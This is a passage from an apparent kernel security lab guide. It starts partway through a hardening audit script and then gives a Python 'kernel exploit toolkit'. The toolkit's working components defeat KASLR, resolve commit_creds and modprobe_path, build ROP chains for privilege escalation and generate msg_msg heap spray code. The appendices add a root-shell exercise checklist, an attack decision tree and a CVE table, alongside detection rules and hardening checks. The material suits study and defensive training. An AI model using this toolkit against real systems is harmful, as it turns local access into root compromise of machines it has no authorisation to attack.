             "KPTI enabled", "Meltdown and KASLR prefetch leak"),
        ]

        for opt, exp, sev, desc, bypass in kconfig_checks:
            self.check_config(opt, exp, sev, desc, bypass)

        # ---- CPU feature checks ----
        self.check_cpu_features()

    def report(self):
        passed = sum(1 for r in self.results if r.passed)
        failed = sum(1 for r in self.results if not r.passed)
        total = len(self.results)

        # Print failures grouped by severity
        for severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]:
            failures = [r for r in self.results if not r.passed and r.severity == severity]
            if failures:
                print(f"\n{'─' * 70}")
                print(f"  {severity.value} FAILURES ({len(failures)})")
                print(f"{'─' * 70}")
                for r in failures:
                    print(f"  {r}")
                    print()

        # Summary
        print(f"\n{'═' * 70}")
        print(f"  SUMMARY: {passed}/{total} checks passed, {failed} failures")
        crit_fails = sum(1 for r in self.results
                         if not r.passed and r.severity == Severity.CRITICAL)
        high_fails = sum(1 for r in self.results
                         if not r.passed and r.severity == Severity.HIGH)
        print(f"  CRITICAL failures: {crit_fails}")
        print(f"  HIGH failures:     {high_fails}")

        if crit_fails > 0:
            print(f"\n  ⚠ CRITICAL: System has {crit_fails} critical hardening gaps")
            print(f"    These enable fundamental kernel exploitation techniques")
        elif high_fails > 0:
            print(f"\n  ⚠ HIGH: System has {high_fails} high-severity gaps")
        else:
            print(f"\n  ✓ System meets kernel hardening baseline")
        print(f"{'═' * 70}")

        return 1 if crit_fails > 0 else 0

if __name__ == "__main__":
    auditor = KernelHardeningAuditor()
    auditor.run_all_checks()
    sys.exit(auditor.report())
```

---

## PART C: FRAMEWORK DEVELOPMENT — Kernel Exploit Automation Toolkit

```python
#!/usr/bin/env python3
"""kernel_exploit_toolkit.py — Framework for kernel exploit development and analysis.

Provides reusable components for:
- KASLR defeat (multiple techniques)
- Kernel structure resolution
- Cross-cache spray automation
- ROP chain construction
- Exploit primitive management
- modprobe_path / cred overwrite helpers
- Detection rule generation

Educational and authorized testing use only."""

import struct
import ctypes
import os
import sys
import subprocess
import re
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple
from pathlib import Path
from enum import Enum, auto


class ExploitStage(Enum):
    INFO_LEAK = auto()
    KASLR_DEFEAT = auto()
    HEAP_MANIPULATION = auto()
    ARBITRARY_WRITE = auto()
    PRIVILEGE_ESCALATION = auto()
    RETURN_TO_USERSPACE = auto()


@dataclass
class KernelSymbol:
    name: str
    address: int
    type: str  # T=text, D=data, etc.
    offset_from_base: int = 0


@dataclass
class GadgetInfo:
    address: int
    instructions: str
    offset_from_base: int
    bytes_hex: str


@dataclass
class SlabCacheInfo:
    name: str
    obj_size: int
    objs_per_slab: int
    pages_per_slab: int
    active_objs: int
    num_objs: int

    @property
    def free_objs(self) -> int:
        return self.num_objs - self.active_objs

    @property
    def utilization(self) -> float:
        return self.active_objs / max(self.num_objs, 1)


class KASLRDefeat:
    """Multiple techniques for defeating kernel ASLR."""

    def __init__(self):
        self.kernel_base: Optional[int] = None
        self.method_used: Optional[str] = None

    def via_kallsyms(self) -> Optional[int]:
        """Read kernel base from /proc/kallsyms (kptr_restrict=0 required)."""
        try:
            with open("/proc/kallsyms", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[2] == "_text":
                        addr = int(parts[0], 16)
                        if addr != 0:
                            self.kernel_base = addr
                            self.method_used = "kallsyms"
                            return addr
        except (PermissionError, FileNotFoundError):
            pass
        return None

    def via_module_leak(self, proc_path: str = "/proc/vuln_leak") -> Optional[int]:
        """Read kernel pointer from a vulnerable module's proc interface."""
        try:
            with open(proc_path, "r") as f:
                content = f.read()
            # Parse leaked pointer
            match = re.search(r"0x([0-9a-f]+)", content)
            if match:
                leaked = int(match.group(1), 16)
                # Heuristic: kernel text pointers start with 0xffffffff8
                if leaked & 0xffffffff00000000 == 0xffffffff00000000:
                    # Align to 2MB boundary for KASLR base estimation
                    base_estimate = leaked & ~0x1fffff
                    self.kernel_base = base_estimate
                    self.method_used = "module_leak"
                    return base_estimate
        except (FileNotFoundError, PermissionError):
            pass
        return None

    def via_dmesg(self) -> Optional[int]:
        """Search dmesg for leaked kernel pointers."""
        try:
            output = subprocess.check_output(
                ["dmesg"], stderr=subprocess.DEVNULL, text=True
            )
            # Look for kernel text pointer patterns
            pattern = r"(ffffffff[89a-f][0-9a-f]{7})"
            matches = re.findall(pattern, output)
            if matches:
                # Take the lowest address as likely near _text
                addrs = sorted(set(int(m, 16) for m in matches))
                base = addrs[0] & ~0x1fffff
                self.kernel_base = base
                self.method_used = "dmesg"
                return base
        except (subprocess.SubprocessError, PermissionError):
            pass
        return None

    def defeat(self) -> int:
        """Try all KASLR defeat methods in order of reliability."""
        methods = [
            self.via_kallsyms,
            self.via_module_leak,
            self.via_dmesg,
        ]
        for method in methods:
            result = method()
            if result:
                return result
        raise RuntimeError("All KASLR defeat methods failed")


class KernelSymbolResolver:
    """Resolve kernel symbol addresses after KASLR defeat."""

    def __init__(self, kernel_base: int, vmlinux_path: Optional[str] = None):
        self.kernel_base = kernel_base
        self.symbols: Dict[str, KernelSymbol] = {}
        self._load_symbols(vmlinux_path)

    def _load_symbols(self, vmlinux_path: Optional[str]):
        """Load symbols from kallsyms or vmlinux."""
        # Try /proc/kallsyms first
        try:
            with open("/proc/kallsyms", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        addr = int(parts[0], 16)
                        if addr == 0:
                            continue
                        sym_type = parts[1]
                        name = parts[2]
                        self.symbols[name] = KernelSymbol(
                            name=name,
                            address=addr,
                            type=sym_type,
                            offset_from_base=addr - self.kernel_base,
                        )
        except (PermissionError, FileNotFoundError):
            pass

        # Try vmlinux nm output
        if vmlinux_path and not self.symbols:
            try:
                output = subprocess.check_output(
                    ["nm", vmlinux_path], text=True, stderr=subprocess.DEVNULL
                )
                for line in output.splitlines():
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        offset = int(parts[0], 16)
                        sym_type = parts[1]
                        name = parts[2]
                        self.symbols[name] = KernelSymbol(
                            name=name,
                            address=self.kernel_base + offset,
                            type=sym_type,
                            offset_from_base=offset,
                        )
            except (subprocess.SubprocessError, FileNotFoundError):
                pass

    def resolve(self, name: str) -> Optional[int]:
        """Resolve a symbol name to its runtime address."""
        sym = self.symbols.get(name)
        return sym.address if sym else None

    def resolve_critical(self) -> Dict[str, int]:
        """Resolve commonly needed symbols for exploitation."""
        critical = [
            "commit_creds", "prepare_kernel_cred",
            "modprobe_path", "core_pattern",
            "init_cred", "init_task",
            "swapgs_restore_regs_and_return_to_usermode",
            "native_write_cr4",
        ]
        return {name: self.resolve(name) for name in critical
                if self.resolve(name) is not None}


class ROPChainBuilder:
    """Build kernel ROP chains for privilege escalation."""

    def __init__(self, kernel_base: int, gadgets: Dict[str, int]):
        self.kernel_base = kernel_base
        self.gadgets = gadgets
        self.chain: List[int] = []

    def add_gadget(self, name: str, *args: int):
        """Add a gadget and its arguments to the chain."""
        if name not in self.gadgets:
            raise ValueError(f"Gadget '{name}' not found")
        self.chain.append(self.gadgets[name])
        self.chain.extend(args)

    def add_raw(self, *values: int):
        """Add raw values to the chain."""
        self.chain.extend(values)

    def build_commit_creds_chain(self, symbols: Dict[str, int],
                                  user_rip: int, user_cs: int,
                                  user_rflags: int, user_sp: int,
                                  user_ss: int) -> bytes:
        """Build the canonical commit_creds(prepare_kernel_cred(0)) chain
        with KPTI trampoline return."""
        self.chain = []

        # Stage 1: prepare_kernel_cred(NULL)
        self.add_gadget("pop_rdi_ret", 0)
        self.add_raw(symbols["prepare_kernel_cred"])

        # Stage 2: mov rdi, rax (move return value for commit_creds)
        if "mov_rdi_rax_ret" in self.gadgets:
            self.add_gadget("mov_rdi_rax_ret")
        elif "mov_rdi_rax_pop2_ret" in self.gadgets:
            self.add_gadget("mov_rdi_rax_pop2_ret", 0, 0)

        # Stage 3: commit_creds
        self.add_raw(symbols["commit_creds"])

        # Stage 4: KPTI trampoline return
        kpti = symbols.get("swapgs_restore_regs_and_return_to_usermode")
        if kpti:
            self.add_raw(kpti + 22)  # Skip initial register pops
            self.add_raw(0, 0)       # Trampoline padding
        else:
            # Fallback: swapgs + iretq (no KPTI)
            self.add_gadget("swapgs_pop_rbp_iretq", 0)

        # iretq frame
        self.add_raw(user_rip, user_cs, user_rflags, user_sp, user_ss)

        return struct.pack(f"<{len(self.chain)}Q", *self.chain)

    def build_modprobe_chain(self, symbols: Dict[str, int],
                              payload_path: str = "/tmp/x") -> bytes:
        """Build a chain that overwrites modprobe_path (data-only, no cred change).
        Requires an arbitrary write gadget in the chain."""
        self.chain = []

        modprobe_addr = symbols.get("modprobe_path")
        if not modprobe_addr:
            raise ValueError("modprobe_path address not resolved")

        # This is simpler than commit_creds — just write a string.
        # Requires a "write string" gadget sequence.
        # In practice, use the arb-write primitive directly rather than ROP.
        path_bytes = payload_path.encode() + b"\x00"
        for i in range(0, len(path_bytes), 8):
            chunk = path_bytes[i:i+8].ljust(8, b"\x00")
            value = struct.unpack("<Q", chunk)[0]
            # pop rdi (addr); pop rsi (value); mov [rdi], rsi; ret
            if "write_gadget" in self.gadgets:
                self.add_gadget("pop_rdi_ret", modprobe_addr + i)
                self.add_gadget("pop_rsi_ret", value)
                self.add_gadget("write_gadget")

        return struct.pack(f"<{len(self.chain)}Q", *self.chain)


class CrossCacheManager:
    """Manage cross-cache exploitation spray and reclaim operations."""

    def __init__(self):
        self.caches = self._parse_slabinfo()

    def _parse_slabinfo(self) -> List[SlabCacheInfo]:
        """Parse /proc/slabinfo for cache parameters."""
        caches = []
        try:
            with open("/proc/slabinfo", "r") as f:
                lines = f.readlines()[2:]  # Skip header
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 6:
                        caches.append(SlabCacheInfo(
                            name=parts[0],
                            obj_size=int(parts[3]),
                            objs_per_slab=int(parts[4]),
                            pages_per_slab=int(parts[5]),
                            active_objs=int(parts[1]),
                            num_objs=int(parts[2]),
                        ))
        except (PermissionError, FileNotFoundError):
            pass
        return caches

    def find_target_cache(self, obj_size: int) -> Optional[SlabCacheInfo]:
        """Find the kmalloc cache that services allocations of obj_size."""
        candidates = sorted(
            [c for c in self.caches if c.obj_size >= obj_size and "kmalloc" in c.name],
            key=lambda c: c.obj_size,
        )
        return candidates[0] if candidates else None

    def calculate_spray_params(self, vuln_obj_size: int) -> Dict[str, int]:
        """Calculate spray parameters for cross-cache reclamation."""
        cache = self.find_target_cache(vuln_obj_size)
        if not cache:
            return {}

        return {
            "cache_name": cache.name,
            "obj_size": cache.obj_size,
            "objs_per_slab": cache.objs_per_slab,
            "drain_count": cache.objs_per_slab * 4,
            "spray_count": cache.objs_per_slab * 8,
            "msg_body_size": cache.obj_size - 48,  # sizeof(struct msg_msg) = 48
        }

    def generate_spray_code(self, params: Dict[str, int]) -> str:
        """Generate C code for msg_msg spray matching target cache."""
        return f"""
// Auto-generated spray for {params.get('cache_name', 'unknown')} cache
#define SPRAY_COUNT     {params.get('spray_count', 256)}
#define MSG_BODY_SIZE   {params.get('msg_body_size', 208)}
#define MSG_TYPE        0x41414141L

int spray_msg_msg(int *qids) {{
    struct {{ long mtype; char mtext[MSG_BODY_SIZE]; }} msg;
    msg.mtype = MSG_TYPE;
    memset(msg.mtext, 'A', MSG_BODY_SIZE);

    for (int i = 0; i < SPRAY_COUNT; i++) {{
        qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qids[i] < 0) return i;
        if (msgsnd(qids[i], &msg, MSG_BODY_SIZE, 0) < 0) return i;
    }}
    return SPRAY_COUNT;
}}
"""


class DetectionRuleGenerator:
    """Generate detection rules (Sigma, YARA, auditd) for exploit techniques."""

    @staticmethod
    def sigma_priv_esc(title: str, description: str) -> str:
        return f"""title: {title}
id: {os.urandom(8).hex()}
status: experimental
description: {description}
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    key: priv_esc_monitor
  filter_uid_change:
    auid: "!0"
    euid: "0"
  filter_legitimate:
    exe|contains:
      - "/usr/bin/su"
      - "/usr/bin/sudo"
      - "/usr/bin/pkexec"
  condition: selection and filter_uid_change and not filter_legitimate
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068"""

    @staticmethod
    def auditd_rules() -> str:
        return """# Kernel exploitation monitoring
-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -F a0=0 -F auid!=0 -F key=priv_esc_monitor
-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -F key=kernel_module_ops
-a always,exit -F arch=b64 -S kexec_load -S kexec_file_load -F key=kexec_attempt
-a always,exit -F arch=b64 -S userfaultfd -F key=userfaultfd_create
-a always,exit -F arch=b64 -S bpf -F key=bpf_ops
-w /proc/sys/kernel/core_pattern -p wa -k core_pattern_modify
-w /proc/sys/kernel/modprobe -p wa -k modprobe_path_modify
-w /dev/mem -p rw -k devmem_access"""


class KernelExploitPipeline:
    """Orchestrate the full exploit pipeline from info leak to root."""

    def __init__(self):
        self.kaslr = KASLRDefeat()
        self.kernel_base: Optional[int] = None
        self.symbols: Dict[str, int] = {}
        self.stage: ExploitStage = ExploitStage.INFO_LEAK

    def execute_pipeline(self, write_primitive=None) -> bool:
        """Execute the canonical kernel exploitation pipeline.
        Returns True if all stages succeed."""

        # Stage 1: KASLR defeat
        print(f"[{self.stage.name}] Defeating KASLR...")
        try:
            self.kernel_base = self.kaslr.defeat()
            print(f"    Kernel base: {self.kernel_base:#x}")
            print(f"    Method: {self.kaslr.method_used}")
        except RuntimeError as e:
            print(f"    FAILED: {e}")
            return False

        self.stage = ExploitStage.KASLR_DEFEAT

        # Stage 2: Symbol resolution
        print(f"\n[{self.stage.name}] Resolving symbols...")
        resolver = KernelSymbolResolver(self.kernel_base)
        self.symbols = resolver.resolve_critical()
        for name, addr in self.symbols.items():
            print(f"    {name}: {addr:#x}")

        if "commit_creds" not in self.symbols:
            print("    FAILED: Cannot resolve critical symbols")
            return False

        self.stage = ExploitStage.PRIVILEGE_ESCALATION

        # Stage 3: Privilege escalation
        print(f"\n[{self.stage.name}] Ready for privilege escalation")
        print(f"    Available techniques:")
        if "modprobe_path" in self.symbols:
            print(f"    [1] modprobe_path overwrite (data-only, simple)")
        if "commit_creds" in self.symbols:
            print(f"    [2] commit_creds ROP chain (code execution)")
        print(f"    [3] Direct cred modification (data-only, bypasses CFI)")

        return True

    def report(self) -> str:
        """Generate a report of the exploitation pipeline state."""
        lines = [
            "=" * 60,
            "  KERNEL EXPLOIT PIPELINE STATUS",
            "=" * 60,
            f"  Kernel base:    {self.kernel_base:#x}" if self.kernel_base else "  Kernel base:    UNKNOWN",
            f"  Current stage:  {self.stage.name}",
            f"  Symbols found:  {len(self.symbols)}",
            "",
            "  Resolved symbols:",
        ]
        for name, addr in self.symbols.items():
            lines.append(f"    {name:40s} {addr:#x}")
        lines.append("=" * 60)
        return "\n".join(lines)


# ---- Main entry point for demonstration ----
if __name__ == "__main__":
    print("=" * 60)
    print("  KERNEL EXPLOIT TOOLKIT — Educational Framework")
    print("  For authorized security research only")
    print("=" * 60)
    print()

    # Demo: Run the exploitation pipeline
    pipeline = KernelExploitPipeline()
    success = pipeline.execute_pipeline()
    print()
    print(pipeline.report())

    if success:
        # Demo: Generate cross-cache spray parameters
        print("\n[*] Cross-cache spray parameters for size-256 objects:")
        ccm = CrossCacheManager()
        params = ccm.calculate_spray_params(256)
        for k, v in params.items():
            print(f"    {k}: {v}")

        # Demo: Generate detection rules
        print("\n[*] Detection rules for this exploit class:")
        print(DetectionRuleGenerator.auditd_rules())
```

---

## Lab Validation Checklist

| Exercise | Technique | Success Criteria |
|----------|-----------|-----------------|
| 1 | KASLR bypass (info leak) | Kernel base address computed correctly |
| 2 | SMEP bypass (CR4 ROP) | User-space shellcode executes in ring 0 (on pre-5.3 kernel) |
| 3 | SMAP bypass (physmap spray) | Controlled data accessible via kernel address |
| 4 | Kernel ROP (commit_creds + KPTI) | uid=0 shell obtained |
| 5 | Cross-cache UAF (msg_msg) | Kernel heap pointers leaked, OOB read achieved |
| 6 | modprobe_path overwrite | SUID root shell created via kernel-spawned script |
| 7 | Dirty Pipe (CVE-2022-0847) | File content modified via read-only fd |
| 8 | Seccomp bypass | TIF_SECCOMP concept demonstrated |
| 9 | LKRG deployment | Runtime credential monitoring active |
| 10 | eBPF detection | Tetragon/Falco policies generating alerts |
| 11 | Hardening audit | Full sysctl/boot/kconfig assessment complete |

---

## Appendix A: Kernel Mitigation Interaction Matrix

```
                  KASLR  SMEP   SMAP   KPTI   CET-IBT  CET-SHSTK  CFI    Seccomp
                  ─────  ─────  ─────  ─────  ───────  ─────────  ─────  ───────
Info leak         BLOCKS  ──     ──     ──      ──       ──         ──     ──
ret2usr            ──    BLOCKS  ──     ──      ──       ──         ──     ──
User data stage    ──     ──    BLOCKS  ──      ──       ──         ──     ──
Prefetch probe    ──     ──     ──    BLOCKS    ──       ──         ──     ──
ROP (indirect)    ──     ──     ──     ──     BLOCKS     ──         ──     ──
ROP (ret-based)   ──     ──     ──     ──      ──      BLOCKS      ──     ──
Vtable hijack     ──     ──     ──     ──      ──       ──        BLOCKS   ──
Syscall attack    ──     ──     ──     ──      ──       ──         ──    BLOCKS

Legend: BLOCKS = this mitigation directly prevents this technique
        ──     = mitigation does not affect this technique
```

## Appendix B: Data-Only Attack Decision Tree

```
Has arbitrary kernel WRITE?
├── YES → Need code execution?
│         ├── NO (data-only sufficient) →
│         │   ├── modprobe_path available? (not __ro_after_init)
│         │   │   ├── YES → Overwrite modprobe_path → trigger unknown binfmt → ROOT
│         │   │   └── NO → Try core_pattern or poweroff_cmd
│         │   ├── Can locate current->cred?
│         │   │   ├── YES → Overwrite uid/gid/caps to 0/all → ROOT
│         │   │   └── NO → Need READ primitive for cred location
│         │   └── selinux_enforcing writable?
│         │       ├── YES → Write 0 → disable SELinux
│         │       └── NO → __ro_after_init → need PTE manipulation
│         └── YES (need execution) →
│             ├── CET Shadow Stack active?
│             │   ├── YES → ROP impossible → use JOP or data-only
│             │   └── NO → Build ROP chain (Exercise 4)
│             └── Kernel CFI active?
│                 ├── YES → Indirect calls must land on ENDBR64
│                 └── NO → Traditional function pointer hijack
└── NO → Need write primitive first
    ├── Have UAF? → Cross-cache (Exercise 5) → corrupt msg_msg → OOB write
    ├── Have overflow? → Overwrite adjacent object → function ptr or data
    └── Have race? → userfaultfd/FUSE stall → win race → get write
```

## Appendix C: CVE Reference Table

| CVE | Year | Type | Technique | Mitigations Bypassed |
|-----|------|------|-----------|---------------------|
| CVE-2022-0847 | 2022 | Logic bug | Dirty Pipe page-cache corruption | ALL (no memory corruption) |
| CVE-2022-4543 | 2022 | Side-channel | EntryBleed KASLR bypass | KASLR (defeats via TLB timing) |
| CVE-2023-32233 | 2023 | UAF | nf_tables cross-cache → modprobe_path | KASLR+SMEP+SMAP+KPTI+CFI |
| CVE-2024-1086 | 2024 | Double-free | nf_tables page-level PTE control | ALL (physical memory manipulation) |
| CVE-2022-0185 | 2022 | Heap overflow | fsconfig overflow → heap info leak | KASLR (info leak stage) |
| CVE-2021-3490 | 2021 | Verifier bypass | eBPF ALU32 bounds → arbitrary R/W | KASLR+seccomp (from eBPF context) |
| CVE-2023-2163 | 2023 | Verifier bypass | eBPF precision tracking → OOB | KASLR (verifier-assisted leak) |

## Appendix D: Windows Kernel Hardening Verification

```powershell
# Quick Windows kernel hardening status check
function Test-KernelHardening {
    $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
    [ordered]@{
        "VBS"              = switch($dg.VirtualizationBasedSecurityStatus){0{"Off"}1{"Configured"}2{"Running"}}
        "HVCI"             = $dg.SecurityServicesRunning -contains 2
        "Credential Guard" = $dg.SecurityServicesRunning -contains 1
        "Secure Boot"      = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
        "Kernel CET"       = (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KernelShadowStacks") -and
                             (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KernelShadowStacks" -ErrorAction SilentlyContinue).Enabled -eq 1
    } | ForEach-Object { $_.GetEnumerator() } | Format-Table -AutoSize
}
Test-KernelHardening
```

## Appendix E: Tool Quick Reference

| Tool | Purpose | Command |
|------|---------|---------|
| ROPgadget | Find kernel gadgets | `ROPgadget --binary vmlinux --multibr` |
| objdump | Disassemble kernel | `objdump -d vmlinux \| grep "pop rdi"` |
| GDB + QEMU | Debug kernel | `gdb vmlinux -ex "target remote :1234"` |
| bpftrace | Runtime tracing | `bpftrace -e 'kprobe:commit_creds { printf("cred change pid=%d\n", pid); }'` |
| crash | Analyze crash dumps | `crash vmlinux vmcore` |
| LKRG | Runtime integrity | `insmod lkrg.ko lkrg.profile_enforce=2` |
| Tetragon | eBPF monitoring | `tetragon --tracing-policy policy.yaml` |
| Falco | Syscall detection | `falco -r /etc/falco/rules.d/` |
| slabinfo | Heap layout analysis | `cat /proc/slabinfo \| sort -k4 -n` |
| pagemap | Virt-to-phys mapping | `cat /proc/self/pagemap` |
